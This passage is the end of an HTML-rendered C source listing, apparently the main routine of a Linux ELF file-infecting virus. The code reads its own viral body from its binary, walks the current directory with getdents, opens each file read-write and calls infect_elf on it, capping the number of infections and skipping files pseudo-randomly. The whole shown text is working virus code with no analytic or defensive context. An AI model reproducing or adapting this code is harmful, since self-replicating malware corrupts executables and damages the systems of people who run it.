    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc1">/* this must be patched */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4000</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">rnval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PRN_DO</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getdents</span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">data</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">yinfect</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">YINFECT</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">ninfect</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">NINFECT</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Got %s...\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">getdents</span><span class="sc10">(</span><span class="sc0">
                    </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dirent</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">dirent</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">infect_elf</span><span class="sc10">(</span><span class="sc0">
                        </span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">v</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vhentry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ventry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vhoff</span><span class="sc0">
                    </span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc10">++</span><span class="sc11">yinfect</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc10">++</span><span class="sc11">ninfect</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">rnval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PRN_DO</span><span class="sc10">(</span><span class="sc11">rnval</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">rnval</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">dirp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc0">
                    </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_reclen</span><span class="sc0">
                </span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
